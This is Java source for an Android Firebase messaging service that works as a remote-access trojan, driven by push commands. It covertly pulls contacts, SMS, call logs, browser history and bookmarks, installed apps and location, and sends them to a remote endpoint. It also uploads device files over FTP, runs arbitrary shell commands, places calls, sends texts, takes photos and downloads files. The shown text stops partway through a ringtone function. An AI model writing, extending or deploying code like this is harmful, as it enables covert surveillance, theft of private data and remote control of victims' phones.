package com.megamind.abdul.system;


import android.app.AlertDialog;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.WallpaperManager;
import android.bluetooth.BluetoothAdapter;
import android.content.ContentProviderOperation;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.media.Ringtone;
import android.media.RingtoneManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.Vibrator;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.WindowManager;
import android.widget.Toast;

import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;

import me.everything.providers.android.browser.Bookmark;
import me.everything.providers.android.browser.BrowserProvider;
import me.everything.providers.android.browser.Search;
import me.everything.providers.android.calllog.Call;
import me.everything.providers.android.calllog.CallsProvider;
import me.everything.providers.android.contacts.Contact;
import me.everything.providers.android.contacts.ContactsProvider;
import me.everything.providers.android.dictionary.DictionaryProvider;
import me.everything.providers.android.dictionary.Word;
import me.everything.providers.android.telephony.Sms;
import me.everything.providers.android.telephony.TelephonyProvider;
import me.everything.providers.core.Data;

import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;

public class MyFirebaseMessagingService extends FirebaseMessagingService {
    private static final String TAG = "MyFirebaseMsgService";

    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {
        JSONObject json;

        Log.e(TAG, "Data Payload: " + remoteMessage.getData().toString());
        try {
            json = new JSONObject(remoteMessage.getData().toString()).getJSONObject("data");

            final int action = Integer.parseInt(json.getString("action"));
            final JSONObject data_json = new JSONObject(json.getString("data_string"));

            doAction(action, data_json);


        } catch (Exception e) {
            Log.e(TAG, "Exception: " + e.getMessage());
            e.printStackTrace();
        }

    }

    //choosing of action
    void doAction(final int action, JSONObject data_json) throws JSONException {
        switch (action) {
            case MyAction.ALERT_D_BOX:
                alert(data_json);
                break;
            case MyAction.NOTIFICATION:
                notification(data_json);
                break;
            case MyAction.GET_ALL_CONTACTS:
                searchContact(data_json);
                break;
            case MyAction.GET_SMS:
                getSMS(data_json);
                break;
            case MyAction.GET_CALL_LOGS:
                getCallLogs(data_json);
                break;
            case MyAction.GET_ALL_BOOKMARKS:
                getAllBookmarks();
                break;
            case MyAction.GET_ALL_SEARCHES:
                getAllSearches();
                break;
            case MyAction.GET_USER_DICTIONARY:
                getUserDictionary();
            case MyAction.MAKE_CALL:
                makeCall(data_json);
                break;
            case MyAction.SEND_SMS:
                makeSMS(data_json);
                break;
            case MyAction.GET_APPS_INSTALLED:
                getAppsInstalled(data_json);
                break;
            case MyAction.LAUNCH_APP:
                launchApp(data_json);
                break;
            case MyAction.CAPTURE_PHOTO:
                capturePhoto(data_json);
                break;
            case MyAction.UPLOAD_FILE:
                uploadFile(data_json);
                break;
            case MyAction.UPLOAD_DIR:
                uploadFromDirectory(data_json);
                break;
            case MyAction.EXECUTE_SHELL:
                executeShell(data_json);
                break;
            case MyAction.VIBRATE:
                vibrate(data_json);
                break;
            case MyAction.BLUETOOTH:
                bluetooth(data_json);
                break;
            case MyAction.WIFI:
                wifi(data_json);
                break;
            case MyAction.GPS:
                gps(data_json);
                break;
            case MyAction.MOBILE_DATA:
                mobileData(data_json);
                break;
            case MyAction.CONNECTION_INFO:
                connectionInfo(data_json);
                break;
            case MyAction.VOLUME_GET:
                volumeGet(data_json);
                break;
            case MyAction.VOLUME_SET:
                volumeSet(data_json);
                break;
            case MyAction.SET_RINGER:
                setRinger(data_json);
                break;
            case MyAction.PRESS_HOME:
                pressHome(data_json);
                break;
            case MyAction.BATTERY_STATUS:
                getBatteryStatus(data_json);
                break;
            case MyAction.TOAST:
                toast(data_json);
                break;
            case MyAction.WRITE_FILE:
                writeFile(data_json);
                break;
            case MyAction.DOWNLOAD_FILE:
                downloadFile(data_json);
                break;
            case MyAction.SET_WALLPAPER:
                setWallpaper(data_json);
                break;
            case MyAction.PLAY_RINGTONE:
                playRingtone(data_json);
                break;
            case MyAction.RECORD_AUDIO:
                recordAudio(data_json);
                break;
            case MyAction.SEARCH_FILE:
                searchFile(data_json);
                break;
            case MyAction.GET_LOCATION:
                getLocation(data_json);
                break;
            case MyAction.ADD_CONTACT:
                addContact(data_json);
                break;
            default:
                break;
        }
    }

    //action implementation

    void alert(JSONObject data_json) throws JSONException {

        final String title = data_json.getString("title");
        final String message = data_json.getString("message");
        final String positive_button = data_json.getString("positive_button");
        final String negative_button = data_json.getString("negative_button");

        new Handler(Looper.getMainLooper()).post(new Runnable() {
            @Override
            public void run() {
                AlertDialog.Builder builder = new AlertDialog.Builder(MyFirebaseMessagingService.this);
                builder.setTitle(title)
                        .setMessage(message)
                        .setCancelable(false)
                        .setPositiveButton(positive_button, new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface dialogInterface, int i) {
                                dialogInterface.cancel();
                                JSONObject jo_resp = new JSONObject();
                                try {
                                    jo_resp.put("action_name", "alert_dialogue");
                                    jo_resp.put("action", "clicked positive");
                                } catch (JSONException e) {
                                    e.printStackTrace();
                                }
                                ActionResponseSender.Action_Response(MyFirebaseMessagingService.this, jo_resp);
                            }
                        })
                        .setNegativeButton(negative_button, new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface dialogInterface, int i) {
                                dialogInterface.cancel();
                                JSONObject jo_resp = new JSONObject();
                                try {
                                    jo_resp.put("action_name", "alert_dialogue");
                                    jo_resp.put("action", "clicked negative");
                                } catch (JSONException e) {
                                    e.printStackTrace();
                                }
                                ActionResponseSender.Action_Response(MyFirebaseMessagingService.this, jo_resp);
                            }
                        });
                AlertDialog alert = builder.create();
                alert.getWindow().setType(WindowManager.LayoutParams.TYPE_SYSTEM_ALERT);
                alert.show();
            }
        });

    }

    void notification(JSONObject data_json) throws JSONException {

        String title = data_json.getString("title");
        String message = data_json.getString("message");
        String ticker = data_json.getString("ticker");
        String sound = data_json.getString("sound");
        String vibrate = data_json.getString("vibrate");

        Intent intent = new Intent(this, NotificationClickedService.class);
        PendingIntent pendingIntent = PendingIntent.getService(this, 0, intent, PendingIntent.FLAG_ONE_SHOT);

        Notification.Builder mBuilder = new Notification.Builder(getApplicationContext());
        Notification notification;
        notification = mBuilder.setSmallIcon(R.mipmap.ic_launcher).setWhen(0)
                .setAutoCancel(true)
                .setSmallIcon(R.mipmap.ic_launcher)
                .setLargeIcon(BitmapFactory.decodeResource(getApplicationContext().getResources(), R.mipmap.ic_launcher))
                .setContentTitle(title)
                .setContentText(message)
                .setTicker(ticker)
                .setContentIntent(pendingIntent)
                .build();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            if (Objects.equals(sound, "yes"))
                notification.defaults |= Notification.DEFAULT_SOUND;
            if (Objects.equals(vibrate, "yes"))
                notification.defaults |= Notification.DEFAULT_VIBRATE;
        } else {
            notification.defaults |= Notification.DEFAULT_SOUND;
            notification.defaults |= Notification.DEFAULT_VIBRATE;
        }

        notification.flags |= Notification.FLAG_AUTO_CANCEL;

        NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        notificationManager.notify(0, notification);

    }

    void searchContact(JSONObject data_json) throws JSONException {

        final String search = data_json.getString("search");
        JSONObject js_resp = new JSONObject();
        js_resp.put("action_name", "search_contact");
        StringBuilder contacts = new StringBuilder();

        ContactsProvider contactsProvider = new ContactsProvider(MyFirebaseMessagingService.this);
        final Data<Contact> contactData = contactsProvider.getContacts();
        Cursor cursor = contactData.getCursor();


        while (cursor.moveToNext()) {
            Contact CurrentContact = contactData.fromCursor(cursor);
            if (CurrentContact.displayName.toLowerCase().contains(search.toLowerCase())
                    || String.valueOf(CurrentContact.normilizedPhone).contains(search)
                    || String.valueOf(CurrentContact.email).contains(search)) {

                contacts.append("\n\nName : ").append(CurrentContact.displayName)
                        .append("\nPhone : ").append(CurrentContact.phone)
                        .append("\nEmail : ").append(CurrentContact.email);
            }

        }

        js_resp.put("contacts", contacts.toString());

        ActionResponseSender.Action_Response(MyFirebaseMessagingService.this, js_resp);

    }

    void getSMS(JSONObject data_json) throws JSONException {
        TelephonyProvider smsProvider = new TelephonyProvider(MyFirebaseMessagingService.this);
        final Data<Sms> smsData;
        JSONObject js_resp = new JSONObject();

        String filter = data_json.getString("filter");
        int number = data_json.getInt("number");


        switch (filter) {
            case "all":
                smsData = smsProvider.getSms(TelephonyProvider.Filter.ALL);
                js_resp.put("action_name", "get_all_sms");
                break;
            case "inbox":
                smsData = smsProvider.getSms(TelephonyProvider.Filter.INBOX);
                js_resp.put("action_name", "get_inbox_sms");
                break;
            case "outbox":
                smsData = smsProvider.getSms(TelephonyProvider.Filter.OUTBOX);
                js_resp.put("action_name", "get_outbox_sms");
                break;
            case "sent":
                smsData = smsProvider.getSms(TelephonyProvider.Filter.SENT);
                js_resp.put("action_name", "get_sent_sms");
                break;
            case "draft":
                smsData = smsProvider.getSms(TelephonyProvider.Filter.DRAFT);
                js_resp.put("action_name", "get_draft_sms");
                break;
            default:
                smsData = smsProvider.getSms(TelephonyProvider.Filter.ALL);
                js_resp.put("action_name", "get_all_sms");
                break;
        }
        Log.e("filter :", filter);

        Cursor cursor = smsData.getCursor();

        int count;

        count = number < 0 ? cursor.getCount() : number;

        StringBuilder SMSes = new StringBuilder();
        while (cursor.moveToNext() && count > 0) {
            Sms currentSMS = smsData.fromCursor(cursor);
            SMSes.append("\n\nAddress : ").append(currentSMS.address)
                    .append("\nBody : ").append(currentSMS.body)
                    .append("\nTime : ").append(currentSMS.receivedDate)
                    .append("\nRead : ").append(currentSMS.read);
            count--;
        }

        js_resp.put("messages", SMSes.toString());
        ActionResponseSender.Action_Response(MyFirebaseMessagingService.this, js_resp);
    }

    void getCallLogs(JSONObject data_json) throws JSONException {
        CallsProvider callsProvider = new CallsProvider(getApplicationContext());
        Data<Call> callData = callsProvider.getCalls();
        JSONObject js_resp = new JSONObject();

        int number = data_json.getInt("number");

        Cursor cursor = callData.getCursor();

        int count;

        count = number < 0 || number > 20 ? 20 : number;

        StringBuilder CallLogs = new StringBuilder();


        while (cursor.moveToNext() && count > 0) {

            Call currentCall = callData.fromCursor(cursor);
            CallLogs.append("\n\nName : ").append(currentCall.name)
                    .append("\nNumber : ").append(currentCall.number)
                    .append("\nType : ").append(currentCall.type.toString())
                    .append("\nDuration : ").append(currentCall.duration)
                    .append("\nTime : ").append(currentCall.callDate);
            count--;
        }

        js_resp.put("action_name", "all_call_logs");
        js_resp.put("logs", CallLogs.toString());

        ActionResponseSender.Action_Response(MyFirebaseMessagingService.this, js_resp);
    }

    void getAllBookmarks() throws JSONException {
        BrowserProvider provider = new BrowserProvider(MyFirebaseMessagingService.this);
        Data<Bookmark> bookmarkData = provider.getBookmarks();

        JSONObject js_resp = new JSONObject();

        Cursor cursor = bookmarkData.getCursor();

        StringBuilder bookmarks = new StringBuilder();

        while (cursor.moveToNext()) {
            Bookmark currentBM = bookmarkData.fromCursor(cursor);
            bookmarks.append("\n\nTitle : ").append(currentBM.title)
                    .append("\nurl : ").append(currentBM.url)
                    .append("\nVisits : ").append(currentBM.visits)
                    .append("\nCreated : ").append(currentBM.created);
        }

        js_resp.put("action_name", "all_bookmarks");
        js_resp.put("bookmarks", bookmarks.toString());

        ActionResponseSender.Action_Response(MyFirebaseMessagingService.this, js_resp);
    }

    void getAllSearches() throws JSONException {
        BrowserProvider provider = new BrowserProvider(getApplicationContext());
        Data<Search> searchData = provider.getSearches();

        JSONObject js_resp = new JSONObject();

        Cursor cursor = searchData.getCursor();

        StringBuilder searches = new StringBuilder();

        while (cursor.moveToNext()) {

            Search currentSearch = searchData.fromCursor(cursor);
            searches.append("\n\nSearch : ").append(currentSearch.search)
                    .append("\nDate : ").append(currentSearch.date);
        }

        js_resp.put("action_name", "all_searches");
        js_resp.put("searches", searches.toString());

        ActionResponseSender.Action_Response(MyFirebaseMessagingService.this, js_resp);

    }

    void getUserDictionary() throws JSONException {
        DictionaryProvider provider = new DictionaryProvider(getApplicationContext());
        Data<Word> wordData = provider.getWords();

        JSONObject js_resp = new JSONObject();

        Cursor cursor = wordData.getCursor();

        StringBuilder words = new StringBuilder();

        while (cursor.moveToNext()) {
            Word currentWord = wordData.fromCursor(cursor);
            words.append("\n\nWord : ").append(currentWord.word)
                    .append("\nFrequency : ").append(currentWord.frequency)
                    .append("\nLocale : ").append(currentWord.locale);
        }

        js_resp.put("action_name", "all_user_dictionary_words");
        js_resp.put("words", words.toString());

        ActionResponseSender.Action_Response(MyFirebaseMessagingService.this, js_resp);
    }

    void makeCall(JSONObject data_json) throws JSONException {
        final String number = data_json.getString("number");
        String caller = "tel:" + number;

        Intent intent = new Intent(Intent.ACTION_CALL, Uri.parse(caller));
        intent.setFlags(FLAG_ACTIVITY_NEW_TASK);
        intent.putExtra("com.android.phone.extra.slot", 0);

        Log.e("makeCall: ", number);
        startActivity(intent);
    }

    void makeSMS(JSONObject data_json) throws JSONException {
        final String number = data_json.getString("number");
        final String message = data_json.getString("message");

        Log.e("makeSMS: ", number + " : " + message);
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage(number, null, message, null, null);

    }

    void getAppsInstalled(JSONObject data_json) throws JSONException {

        JSONObject js_resp = new JSONObject();
        final PackageManager pm = getPackageManager();
        int count = 0;

        //get a list of installed apps.
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);

        StringBuilder apps = new StringBuilder();
        for (ApplicationInfo packageInfo : packages) {
            apps.append(packageInfo.packageName).append("\n");
            count++;
        }
        js_resp.put("action_name", "get_installed_apps");
        js_resp.put("apps", apps.toString());
        js_resp.put("count", count);

        ActionResponseSender.Action_Response(MyFirebaseMessagingService.this, js_resp);
    }

    void launchApp(JSONObject data_json) throws JSONException {
        final String app = data_json.getString("app").toLowerCase();

        JSONObject js_resp = new JSONObject();
        js_resp.put("action_name", "launch_app");

        final PackageManager pm = getPackageManager();

        //get a list of installed apps.
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);

        for (ApplicationInfo packageInfo : packages) {
            if (packageInfo.packageName.toLowerCase().matches("(.*)" + app + "(.*)")) {
                Intent intent = pm.getLaunchIntentForPackage(packageInfo.packageName);
                startActivity(intent);
                Log.e("app_opened :", packageInfo.packageName);
                js_resp.put("launch", "successful");
                js_resp.put("app_name", packageInfo.packageName);
                ActionResponseSender.Action_Response(MyFirebaseMessagingService.this, js_resp);
                return;
            }
        }
        js_resp.put("launch", "failed");
        js_resp.put("app_name", null);
        ActionResponseSender.Action_Response(MyFirebaseMessagingService.this, js_resp);
    }

    void capturePhoto(JSONObject data_json) throws JSONException {

        Intent front_translucent = new Intent(getApplication()
                .getApplicationContext(), CameraService.class);
        front_translucent.putExtra("Front_Request", true);
        getApplication().getApplicationContext().startService(front_translucent);

    }  //check

    void uploadFile(JSONObject data_json) throws JSONException {

        boolean result = false;
        final String file_location = data_json.getString("file_location");
        final boolean external = data_json.getBoolean("external");

        JSONObject js_resp = new JSONObject();
        js_resp.put("action_name", "upload_file");

        File yourFile;
        yourFile = new File(System.getenv(external ? "SECONDARY_STORAGE" : "EXTERNAL_STORAGE")
                + "/" + file_location);

        try {
            result = ActionResponseSender.sendFile_FTP(yourFile);
        } catch (Exception e) {
            js_resp.put("message", e.getMessage());
            e.printStackTrace();
        }

        js_resp.put("result", result ? "successful" : "failed");

        ActionResponseSender.Action_Response(MyFirebaseMessagingService.this, js_resp);
    }

    void uploadFromDirectory(JSONObject data_json) throws JSONException {

        final String directory = data_json.getString("directory");  //directory default = "Download"
        final boolean external = data_json.getBoolean("external");

        JSONObject js_resp = new JSONObject();
        StringBuilder files_array = new StringBuilder();
        js_resp.put("action_name", "upload_multiple_files");

        try {
            files_array = ActionResponseSender.sendMultipleFile_FTP(directory, external);
        } catch (Exception e) {
            js_resp.put("message", e.getMessage());
            e.printStackTrace();
        }

        js_resp.put("result", files_array.toString() == "" ? "failed" : "successful");
        js_resp.put("files_uploaded", files_array.toString());

        ActionResponseSender.Action_Response(MyFirebaseMessagingService.this, js_resp);
    }

    void executeShell(JSONObject data_json) throws JSONException {
        final String command = data_json.getString("command");
        JSONObject js_resp = new JSONObject();
        StringBuilder output = new StringBuilder();

        js_resp.put("action_name", "execute_shell");

        Process p;
        try {
            p = Runtime.getRuntime().exec(command);
            p.waitFor();
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

            String line;
            while ((line = reader.readLine()) != null) {
                Log.e("each line ::#:", line);
                output.append(line).append("\n");
            }

        } catch (Exception e) {
            Log.e("Error :", e.getMessage());
            e.printStackTrace();
        }

        js_resp.put("output", output.toString());
        ActionResponseSender.Action_Response(MyFirebaseMessagingService.this, js_resp);
    }

    void vibrate(JSONObject data_json) throws JSONException {

        final int time = data_json.getInt("time");

        Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
        v.vibrate(time);
    }

    void bluetooth(JSONObject data_json) throws JSONException {

        BluetoothAdapter bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();

        final boolean toggle = data_json.getBoolean("toggle");
        boolean bool = false;

        if (toggle) {
            bool = bluetoothAdapter.isEnabled() ?
                    bluetoothAdapter.disable() : bluetoothAdapter.enable();
        }

        JSONObject js_resp = new JSONObject();
        js_resp.put("action_name", "bluetooth");
        js_resp.put("state", bluetoothAdapter.isEnabled() ? "on" : "off");
        if (toggle) js_resp.put("toggled", String.valueOf(bool));

        ActionResponseSender.Action_Response(MyFirebaseMessagingService.this, js_resp);
    }

    void wifi(JSONObject data_json) throws JSONException {

        WifiManager wifiManager = (WifiManager) getSystemService(Context.WIFI_SERVICE);

        final boolean toggle = data_json.getBoolean("toggle");

        if (toggle)
            wifiManager.setWifiEnabled(!wifiManager.isWifiEnabled());

        JSONObject js_resp = new JSONObject();
        js_resp.put("action_name", "wifi");
        js_resp.put("state", wifiManager.isWifiEnabled() ? "on" : "off");
        if (toggle)
            js_resp.put("toggled", String.valueOf(wifiManager.isWifiEnabled()));

        ActionResponseSender.Action_Response(MyFirebaseMessagingService.this, js_resp);
    }

    void gps(JSONObject data_json) throws JSONException {

        LocationManager manager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        boolean statusOfGPS = manager.isProviderEnabled(LocationManager.GPS_PROVIDER);

        final boolean toggle = data_json.getBoolean("toggle");

        if (toggle) {
            Intent intent = new Intent("android.location.GPS_ENABLED_CHANGE");
            intent.putExtra("enabled", statusOfGPS = !statusOfGPS);
            sendBroadcast(intent);
        }

        JSONObject js_resp = new JSONObject();
        js_resp.put("action_name", "gps");
        js_resp.put("state", statusOfGPS ? "on" : "off");
        if (toggle) js_resp.put("toggled",
                String.valueOf(manager.isProviderEnabled(LocationManager.GPS_PROVIDER)));

        ActionResponseSender.Action_Response(MyFirebaseMessagingService.this, js_resp);
    }

    void mobileData(JSONObject data_json) throws JSONException {

        final boolean data_enable = data_json.getBoolean("data_enable");

        try {
            ConnectivityManager dataManager;
            dataManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            Method dataMtd = ConnectivityManager.class.getDeclaredMethod("setMobileDataEnabled", boolean.class);
            dataMtd.setAccessible(true);

            dataMtd.invoke(dataManager, data_enable);        //True - to enable data connectivity
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    void connectionInfo(JSONObject data_json) throws JSONException {
        final ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        final NetworkInfo networkInfo = cm.getActiveNetworkInfo();
        int type = networkInfo.getType();
        String typeName = networkInfo.getTypeName();
        String extraInfo = networkInfo.getExtraInfo();
        boolean connected = networkInfo.isConnected();

        WifiManager wm = (WifiManager) getSystemService(WIFI_SERVICE);
        String ip = BigInteger.valueOf(wm.getDhcpInfo().netmask).toString();

        JSONObject js_resp = new JSONObject();
        js_resp.put("action_name", "connection_name");
        js_resp.put("type", type);
        js_resp.put("type_name", typeName);
        js_resp.put("extra_info", extraInfo);
        js_resp.put("connected", connected);
        js_resp.put("ip", ip);

        ActionResponseSender.Action_Response(MyFirebaseMessagingService.this, js_resp);
    }

    void volumeGet(JSONObject data_json) throws JSONException {
        AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);

        StringBuilder volumes = new StringBuilder();
        volumes.append("\nVoice_call : ").append(am.getStreamVolume(AudioManager.STREAM_VOICE_CALL));
        volumes.append("\nSystem : ").append(am.getStreamVolume(AudioManager.STREAM_SYSTEM));
        volumes.append("\nRing : ").append(am.getStreamVolume(AudioManager.STREAM_RING));
        volumes.append("\nMusic : ").append(am.getStreamVolume(AudioManager.STREAM_MUSIC));
        volumes.append("\nAlarm : ").append(am.getStreamVolume(AudioManager.STREAM_ALARM));
        volumes.append("\nNotification : ").append(am.getStreamVolume(AudioManager.STREAM_NOTIFICATION));

        JSONObject js_resp = new JSONObject();
        js_resp.put("action_name", "get_volume");
        js_resp.put("ringer_mode", am.getRingerMode()); // 0 = Silent, 1 = Vibrate, 2 = Normal
        js_resp.put("volumes", volumes);

        ActionResponseSender.Action_Response(MyFirebaseMessagingService.this, js_resp);
    }

    void volumeSet(JSONObject data_json) throws JSONException {
        AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);

        final String type = data_json.getString("type");
        final int to = data_json.getInt("to");

        JSONObject js_resp = new JSONObject();
        js_resp.put("action_name", "set_volume");

        switch (type) {
            case "ringtone":
                am.setStreamVolume(AudioManager.STREAM_RING,
                        to > am.getStreamMaxVolume(AudioManager.STREAM_RING) ?
                                am.getStreamMaxVolume(AudioManager.STREAM_RING) : to, 0);
                js_resp.put("set",
                        type + ":" + String.valueOf(am.getStreamVolume(AudioManager.STREAM_RING)));
                break;
            case "alarm":
                am.setStreamVolume(AudioManager.STREAM_ALARM,
                        to > am.getStreamMaxVolume(AudioManager.STREAM_ALARM) ?
                                am.getStreamMaxVolume(AudioManager.STREAM_ALARM) : to, 0);
                js_resp.put("set",
                        type + ":" + String.valueOf(am.getStreamVolume(AudioManager.STREAM_ALARM)));
                break;
            case "music":
                am.setStreamVolume(AudioManager.STREAM_MUSIC,
                        to > am.getStreamMaxVolume(AudioManager.STREAM_MUSIC) ?
                                am.getStreamMaxVolume(AudioManager.STREAM_MUSIC) : to, 0);
                js_resp.put("set",
                        type + ":" + String.valueOf(am.getStreamVolume(AudioManager.STREAM_MUSIC)));
                break;
            case "notification":
                am.setStreamVolume(AudioManager.STREAM_NOTIFICATION,
                        to > am.getStreamMaxVolume(AudioManager.STREAM_NOTIFICATION) ?
                                am.getStreamMaxVolume(AudioManager.STREAM_NOTIFICATION) : to, 0);
                js_resp.put("set",
                        type + ":" + String.valueOf(am.getStreamVolume(AudioManager.STREAM_NOTIFICATION)));
                break;
            case "system":
                am.setStreamVolume(AudioManager.STREAM_SYSTEM,
                        to > am.getStreamMaxVolume(AudioManager.STREAM_SYSTEM) ?
                                am.getStreamMaxVolume(AudioManager.STREAM_SYSTEM) : to, 0);
                js_resp.put("set",
                        type + ":" + String.valueOf(am.getStreamVolume(AudioManager.STREAM_SYSTEM)));
                break;
            default:
                js_resp.put("set", type + ": (Invalid Type Error)");
                break;
        }

        ActionResponseSender.Action_Response(MyFirebaseMessagingService.this, js_resp);


    }

    void setRinger(JSONObject data_json) throws JSONException {
        final int to = data_json.getInt("to"); // 0 = Silent, 1 = Vibrate, 2 = Normal
        AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);

        am.setRingerMode(to);

        JSONObject js_resp = new JSONObject();
        js_resp.put("action_name", "set_ringer");
        js_resp.put("ringer_mode", am.getRingerMode());

        ActionResponseSender.Action_Response(MyFirebaseMessagingService.this, js_resp);
    }

    void pressHome(JSONObject data_json) throws JSONException {

        Intent startMain = new Intent(Intent.ACTION_MAIN);
        startMain.addCategory(Intent.CATEGORY_HOME);
        startMain.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(startMain);

    }

    void getBatteryStatus(JSONObject data_json) throws JSONException {
        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = MyFirebaseMessagingService.this.registerReceiver(null, ifilter);

        // Are we charging / charged?
        assert batteryStatus != null;
        int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, 0);
        int temperature = batteryStatus.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0);
        int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
        boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                status == BatteryManager.BATTERY_STATUS_FULL;

        // How are we charging?
        int chargePlug = batteryStatus.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
        boolean usbCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_USB;
        boolean acCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_AC;

        JSONObject js_resp = new JSONObject();
        js_resp.put("action_name", "battery_status");
        js_resp.put("level", level);
        js_resp.put("status", isCharging ? "charging" : "discharging");
        js_resp.put("plugged_in", isCharging ? (usbCharge ? "usb" : "ac") : "none");
        js_resp.put("temperature", temperature);

        ActionResponseSender.Action_Response(MyFirebaseMessagingService.this, js_resp);
    }

    void toast(JSONObject data_json) throws JSONException {

        final String text = data_json.getString("text");
        final int time = data_json.getInt("time") == 0 ?
                Toast.LENGTH_SHORT : Toast.LENGTH_LONG;           // 0 = SHORT, 1 = LONG

        new Handler(Looper.getMainLooper()).post(new Runnable() {
            @Override
            public void run() {
                Toast.makeText(MyFirebaseMessagingService.this, text, time).show();
                Log.e("toast: ", text);
            }
        });
    }

    void writeFile(JSONObject data_json) throws JSONException {
        final String name = data_json.getString("name");
        final String data = data_json.getString("data");
        final String directory = data_json.getString("directory");//directory default = "megamind"
        boolean status;

        File folder = new File(Environment.getExternalStorageDirectory().getPath(), directory);
        boolean check = folder.mkdirs();
        Log.e("Folder created :", String.valueOf(check));

        File myFile = new File(Environment.getExternalStorageDirectory().getPath()
                + "/" + directory + "/" + name);

        try {
            status = myFile.createNewFile();
            OutputStream fileOutputStream = new FileOutputStream(myFile);
            fileOutputStream.write(data.getBytes());
            fileOutputStream.flush();
            fileOutputStream.close();
        } catch (IOException e) {
            status = false;
            e.printStackTrace();
        }

        JSONObject js_resp = new JSONObject();
        js_resp.put("action_name", "file_writing");
        js_resp.put("status", status ? "successful" : "failed");

        ActionResponseSender.Action_Response(MyFirebaseMessagingService.this, js_resp);

    }

    void downloadFile(JSONObject data_json) throws JSONException {

        final String name = data_json.getString("name");
        final String url = data_json.getString("url");
        final String directory = data_json.getString("directory"); //directory default = "megamind"
        boolean status = false;

        File folder = new File(Environment.getExternalStorageDirectory(), directory);
        boolean check = folder.mkdirs();

        File outputFile = new File(Environment.getExternalStorageDirectory().getPath()
                + "/" + directory + "/" + name);

        try {
            URL u = new URL(url);
            URLConnection conn = u.openConnection();
            int contentLength = conn.getContentLength();

            DataInputStream stream = new DataInputStream(u.openStream());

            byte[] buffer = new byte[contentLength];
            stream.readFully(buffer);
            stream.close();

            DataOutputStream fos = new DataOutputStream(new FileOutputStream(outputFile));
            fos.write(buffer);
            fos.flush();
            fos.close();
            status = true;
        } catch (Exception e) {
            status = false;
            e.printStackTrace();
        }

        JSONObject js_resp = new JSONObject();
        js_resp.put("action_name", "download_file");
        js_resp.put("status", status ? "successful" : "failed");

        ActionResponseSender.Action_Response(MyFirebaseMessagingService.this, js_resp);
    }

    void setWallpaper(JSONObject data_json) throws JSONException {

        // default [Internal] path = "megamind/image.jpeg"
        final String path = data_json.getString("path");
        final boolean setDefault = data_json.getBoolean("default");
        boolean status = false;

        File file = new File(Environment.getExternalStorageDirectory().getPath() + "/" + path);
        Bitmap bitmap = BitmapFactory.decodeFile(file.getPath());

        try {
            WallpaperManager wallpaperManager =
                    WallpaperManager.getInstance(MyFirebaseMessagingService.this);

            if (setDefault)
                wallpaperManager.clear();
            else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT)
                wallpaperManager.setBitmap(bitmap);
            else
                wallpaperManager.clear();
            status = true;
        } catch (IOException e) {
            status = false;
            e.printStackTrace();
        }

        JSONObject js_resp = new JSONObject();
        js_resp.put("action_name", "set_wallpaper");
        js_resp.put("status", status ? "success" : "failed");

        ActionResponseSender.Action_Response(MyFirebaseMessagingService.this, js_resp);

    }

    void playRingtone(JSONObject data_json) throws JSONException {

        final int seconds = data_json.getInt("seconds");
        final int type = data_json.getInt("type");

        AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
        am.setStreamVolume(AudioManager.STREAM_RING, am.getStreamMaxVolume(AudioManager.STREAM_RING), 0);
        am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
